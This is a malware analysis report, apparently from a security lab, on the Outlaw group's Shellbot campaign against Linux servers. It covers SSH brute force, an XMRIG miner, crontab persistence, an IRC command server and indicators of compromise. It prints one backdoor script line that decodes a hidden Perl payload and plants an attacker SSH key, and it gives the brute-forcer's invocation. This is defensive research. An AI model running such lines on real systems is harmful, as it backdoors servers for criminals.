The\nLinux malware is the well-known “Shellbot”, it is a crimetool belonging to the arsenal of a threat actor tracked as the “Outlaw Hacking Group.”\n\n[The Outlaw Hacking Group was first spotted by TrendMicro in 2018 when the cyber criminal crew targeted automotive and financial industries.](https://blog.trendmicro.com/trendlabs-security-intelligence/perl-based-shellbot-looks-to-target-organizations-via-cc/)\n[The Outlaw Botnet uses brute force and SSH exploit (exploit Shellshock Flaw and Drupalgeddon2 vulnerability) to achieve remote access to the](https://securityaffairs.co/wordpress/71370/hacking/drupalgeddon2-drupal-flaws.html)\ntarget systems, including server and IoT devices.\n\nThe first version spotted by TrendMicro includes a DDoS script that could be used by botmaster to set-up DDoS for-hire service offered on the\ndark web.\n\nThe main component of this malware implant is a variant of “Shellbot”, a Monero miner bundled with a Perl-based backdoor, which includes an IRCbased bot and an SSH scanner. Shellbot is known since 2005 and even available on GitHub. Now, Shellbot has re-appeared in the threat landscape\nin a recent campaign, targeting organizations worldwide with a new IRC server and new Monero pools, so we decided to deepen the analysis.\n\n[Based on our findings, there are some similarities in both techniques and architectures](https://bitsmash.wordpress.com/2013/01/11/kippo-log-8th-january-2013/) with another cybercrime group, which appeared in the\nwild around 2012, most probably Romanian.\n\n# Technical Analysis\n\nAs previously mentioned, the infection chain starts with the hack of a Linux server, after a SSH brute-force attack as shown in Fig.1. The Access\nLogs include requests coming from different source IP addresses with a delay of about 30 seconds from each other. Using this trick, the bruteforce\nis able to bypass lockout login mechanisms such as Fail2Ban. Once the machine is fully compromised, the attacker will install a complete hacking\nsuite, composed of an IRC bot, an SSH scanner, a bruteforce tool, and an XMRIG crypto-miner. All the malicious logic is opportunely managed by\nseveral bash or perl scripts.\n\n\n-----\n\nFigure 1: Shellbot Bruteforcing\n\nWhen the machine is completely infected, the installed files are the following:\n\n\n-----\n\nFigure 2: Directory listing\n\nThe parent folder is an hidden directory named “. rsync”, it includes three files and three sub-directories. The initial files are “init”, “init2” and “initall”.\nThey are three bash scripts aimed at installing the three main components of the infection. The first component that is executed is “initall”, its\nbody is the following:\n\n\n-----\n\nFigure 3: Content of the initall” file\n\nThe script only has two macro functions, the first one is used to clean the victim machine from some other infections or other processes which\ncould generate some type of collision during the execution. Then, the row 36 shows that the file “init2” is printed on the standard output and then\nexecuted.\n\nFigure 4: Content of the “init2” file\n\n\n-----\n\nFig. 4 shows the content of the _init2 script. Also in this case, the script runs three files,_ _init0,_ _a from the folder_ _b,_ _a from the folder_ _c after_\ncleaning pending processes. Then prepares the settings of the persistence using the “crontab” linux utility. As shown in the configuration of the\njob, the malware prepares a different configuration of task scheduling according to the module and file to be executed:\n\n“/a/upd” file is run every 23 days (line 28);\n“/b/sync” every sunday at 08:05AM (line 29)\n“/b/sync” at the reboot (line 30)\n“/c/aptitude” every three days (line 31)\n\n## The “a” Folder\n\nThe first folder to analyze is “a”. This directory contains the crypto mining module named _kswapd0. In this folder, the first one to be executed is the_\nfile “a”. The script looks like the following:\n\nFigure 5: Content of the “a” file\n\nThe purpose of the script is to optimize the mining module by querying the information about the CPU through the reading of the “ /proc/cpu” and\nwhen the manufacturer is retrieved the script provides to add some specific registry values depending by the vendor through the Model-Specific\nRegister utility “wrmsr”.\n\nThen that the “upd” script is executed. The upd script is quite simple, it checks if the process is alive, otherwise the script “ run” is executed.\n\nFigure 6: Content of “upd” on the left and “run” on the right\n\nThe executed crypto miner is the file named “”kswapd0” based on the famous XMRIG monero crypto miner. Following the fingerprint:\n\n\n-----\n\n### Hash fd9007df08c1bd2cf47fb97443c4d7360e204f4d8fe48c5d603373b2b2975708\n\n Threat Cryptominer\n\n\n### Brief Description\n\n\n### XMRIG Cryptominer and SSH backdoor\n\n\n### Ssdeep 49152:10cWKu0K8CpxlJWhabW/////////In6C1NdvKODyYGhiDC61N04EXBJDJw5qjURX:+d08xrbW/////////viu6T0lXBJDJwE2\n\nTable 1. Sample information\n\nThis component has two main functions:\n\n1. Install a cryptoMiner worker: The main purpose of this elf file is the instantiation of a crypto-mining worker. It is a fork of XMRIG project, one\n\nof the most popular software to mine monero crypto values. This configuration works, as the original, with a configuration file written in\njson, named “config.json”. In the following figure is reported a piece of pseudocode responsible of the loading of the configuration file:\n\nFigure 7: Pseudocode of the loaded configuration file\n\nIn the following figure is reported the configuration file with all monero parameters:\n\n\n-----\n\nFigure 8: Piece of the configuration file with the evidences of user, pass and c2\n\n2. Install a SSH backdoor: the second component is a routine responsible to set a ssh backdoor through the installation of an ssh fingerprint\n\ninside the authorized ssh keys file:\n\nFigure 9: Authorized ssh key\n\n## The “b” Folder\n\nThe “b” folder contains the backdoor logic. It is composed only by three files: “ _a”, “run”, “stop”. They are three bash scripts, which we start to_\nanalyze:\n\nFigure 10: Content of the “a” script file\n\nThe initial script is the file named “a”. It’s main purpose is to check the current working directory and save the file “dir.dir” in it, the next step is to\nlaunch the “stop” script to interrupt the execution of pending processes. In the end, it gives the execution permission and then execute the _run_\nscript:\n\n### #!/bin/shnohup ./stop>>/dev/null &sleep 5echo \" ENCODED-BASE64-PAYLOAD\" | base64 --decode | perlcd ~ && rm -rf .ssh && mkdir .ssh & AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+ mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh\n\nCode Snippet 1\n\nThe run script executes another perl script encoded in base64 format. Then, it retries to store the same ssh key seen in Figure 8. Now let’s deep\ninside the perl script. After decoding the base64 wrapper, we obtain another level of obfuscation in perl leveraging the “pack()” instruction, as\nshown in the following Figure:\n\nFigure 11: Piece of the packed script\n\nHowever it is very easy to decode obtaining the real malicious code:\n\n\n-----\n\nFigure 12: Piece of the ShellBot client\n\nIt is ShellBot malware, one of the most famous IRC bot for Linux. This ShellBot contains all the communication logic to communicate with the C2\nwith the IRC protocol. It is interesting to notice that the C2 45.9.148[.#99 uses an unusual port to manage the IRC protocol, the 443, commonly\nassociated with the HTTPS protocol. The channel is “#007” and the administrators' nicknames from which receive the commands “polly” and\n“molly”. We try to connect it in order to estimate the number of the victims, but unfortunately, the server does not seem to be active at the time of\nwriting.\n\nThe IRC server is on the same subnet of the other C2s and all belong to “ _Nice IT Service Group” a provider from the Netherlands. The C2 deploys an_\n“Unreal ircd” server (Fig. 13). It is funny to notice the string “warez.de” inside the demon banner. Warez.de is an historical and famous deutsche\ncommunity of gaming crackers and hackers.\n\nFigure 13: some information about IRC C2\n\n## The “c” Folder\n\nThen, the init2 script (in Figure 4), execute c/start, as shown in below Figure. The start scripts execute “run” renaming it as “aptitude” in order to go\nunnoticed among processes list.\n\n\n-----\n\nFigure 14: Content of “run” script file\n\nThe “run” script (shown in Fig. 14 ) performs a first check on CPU architecture and a second one on the number of processors. If the bot is running\non a 64 bit system with less than seven processors the “go” script is executed. On line 17 another control is performed: if the system is 32 bit\nwithout the check on the number of processors as in this case. It is not clear why the malware performs these kind of checks.\n\nFigure 15: Content of run script\n\nThe “go” script performs some preliminary operations before starting the “tsm” component as shown in Figure 16. The script checks the\narchitecture and, based on this, defines the number of threads. If it is running on arm architecture, the number of threads is set to 75 (as shown in\nline 9), otherwise the number of threads is set to 515 (as shown by line 5).\n\n\n-----\n\nFigure 16: Content of go script\n\n## The \"tsm\" Module: a Multistage SSH-Bruteforcer\n\nAt this point, the script starts the “tsm” module. This module is a sort of network scanner and bruteforcer named “ Faster Than Lite” (Fig. 17). FTL\ndoesn't seem to be an off-the-shelf tool. Probably is a tool sold on criminal dark forum rather then a custom tool made by this Criminal Actor due\nto the existence of a help menu as shown in Fig. 17.\n\nFigure 17: “Faster Than Light” payload evidence\n\nThe “tsm” tool is then executed with the following parameters:\n\n### timeout 3h ./tsm -t $threads -f 1 -s 12 -S 10 -p 0 -d 1 p ip\n\nLet's explain this configuration: timeout 3 h means that the script executes for 3 hours. **_-f 1 for A.B class /16 scan, -s 12 is the timeout between 2_**\nrequests, 12 seconds in this case, probably to overcome some login lock mechanisms. The -S 10 is the second timeout set to 10 seconds, however\nis not clear the usage of the second timeout. The -p parameterdefines the port to connect to, setting this parameter to 0 means “multiport”, as also\nstated by the help. The -d parameter is not present in the help menu, this is an indicator that this tool maybe is under development and is not yet\nmature (due to the presence of debug information), but “works as expected”. The definition of p ip means to read “ip port\" file, namely the file\nwhich is downloaded by one of the two C2 with encrypted multiple SSH requests as shown by Fig. 18. This is the “Stage 1”.\n\n\n-----\n\nFigure 18: SSH traffic from C2\n\nOnce downloaded the list of IPs, then starts the “Stage 2” also named “Game Over”.\n\nIn this stage it executes the ssh bruteforce logic using the IP contained in the previously downloaded list. At the time of writing, the downloaded\nlist contains 94.541 different IP addresses belonging to different countries. We sort these unique IPs and after aggregate them by country we are\nable to plot them on a World Heat Map in order to show the real distribution. The result is Fig. 19.\n\nAs shown by the Heat Map, the most affected countries are the United _States of America with 34998 IP, followed by 8688 from China, 6891 from_\nGermany, 4068 France. The distribution is homogeneous throughout the European continent, Italy has 658 unique IP.\n\nFigure 19: Distribution of unique IP addresses present in the downloaded list.\n\nWe find that the tsm component contains pscan and ssh-scan, respectively a port scanner and a bruteforcer used in past campaigns. Searching for\n[useful information, we found that it has appeared on several honeypots since 2012, the scripts are similar in styles and in techniques](https://bitsmash.wordpress.com/tag/honeypot/)\n[implemented. In one of this script there is an email “mafia89tm@yahoo.com” and some indicators that lead back to a romanian group.](mailto:mafia89tm@yahoo.com)\n\n# Conclusion\n\nThis Outlaw Botnet is still active and it is targeting organizations worldwide, this time with new monero pools and different C2. The Command and\nControl IRC server is down at the time of writing, but the two C2 which provide the victim IPs list are still active. This means that, most probably,\nthe gang will deploy a new IRC server leaving the rest of the infrastructure untouched. We suggest to harden and update your SSH server\nconfiguring authentication with authorized keys and disabling passwords.\n\n# Indicators of Compromise\n\n\n-----\n\nHashes\n\nac2513b3d37de1e89547d12d4e05a899848847571a3b11b18db0075149e85dcc ./.rsync/c/lib/32/tsm\nb92e77fdc4aa3181ed62b2d0e58298f51f2993321580c8d2e3368ef8d6944364 ./.rsync/c/slow\nf95c1c076b2d78834cc62edd2f4c4f2f6bfa21d07d07853274805859e20261ba ./.rsync/c/watchdog\n99fa6e718f5f54b1c8bf14e7b73aa0cda6fe9793a958bd4e0a12916755c1ca93 ./.rsync/c/tsm64\ne3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 ./.rsync/c/v\nd6c230344520dfc21770300bf8364031e10758d223e8281e2b447c3bf1c43d2b ./.rsync/c/tsm32\n5a1797ae845e8c80c771ece9174b93ad5d5a74e593fe3b508ba105830db5fd92 ./.rsync/c/run\n0bf8868d117a7c45276b6f966c09830b010c550cd16a2b0d753924fca707c842 ./.rsync/c/tsm\n9dbbc9b5d7793425968e42e995226c5f9fe32e502a0a694320a5e838d57c8836 ./.rsync/c/start\nf942240260f0281a3c0e909ac10da7f67f87fb8e2a195e2955510424e35a8c8b ./.rsync/c/stop\ne62be7212627d9375e7b7afd459644d3f8b4c71a370678eb7fa497b9850a02d5 ./.rsync/c/go\n1cc9c6a2c0f2f41900c345b0216023ed51d4e782ed61ed5e39eb423fb2f1ddd8 ./.rsync/c/golan\nb2469af4217d99b16a4b708aa29af0a60edeec3242078f42fa03b8eaf285d657 ./.rsync/b/run\ndc43fdfbb5f7e8ecc80353dcd85889c0c08483c99acbce35b3ed8f399c936920 ./.rsync/b/a\n1c42bfcfb910013ebe02adeb6127884de54ea225161d0a7347c05c2c4e6fbf49 ./.rsync/b/stop\nfd9007df08c1bd2cf47fb97443c4d7360e204f4d8fe48c5d603373b2b2975708 ./.rsync/a/kswapd0\n18b77e655b323fa07dad9d7b64631dbaa428da7d347b9b9497276f4d466079fe ./.rsync/a/run\n9d4fef06b12d18385f1c45dd4e37f031c6590b080ea5446ff7a5bac491daea50 ./.rsync/a/a\n1c7b4c7ab716159b6dc9fc5abc6ae28ab9dfa0d64e3d860824692291a7038a4e ./.rsync/a/stop\ne38ff53f3978c84078b016006389eb3b286443d61cbabb7d5a4f003c8ae67421 ./.rsync/a/init0\nbefdf0be5b811621a72eddafad1886321102be1ec3417030888371c5554d9d1a ./.rsync/initall\n16d93464ebd8f370011bf040cb4aec7699f4be604452eb5efcd77e5d5e67ae1b ./.rsync/init\nC2\n\ndebian-package[.center\n45.9.148[.125\n45.9.148[.129\n45.9.148[.99\n\n## Yara Rules\n\n\n-----\n\nmeta:\n\ndescription = \"XMRIG Miner of the shellbot campaign\"\nhash = \"fd9007df08c1bd2cf47fb97443c4d7360e204f4d8fe48c5d603373b2b2975708\"\nauthor = \"Cybaze - Yoroi ZLab\"\n\nlast_updated = \"2020-04-27\"\ntlp = \"white\"\ncategory = \"informational\"\n\nstrings:\n\n$s1 = { D3 EA FF 98 ?? ?? ?? ??
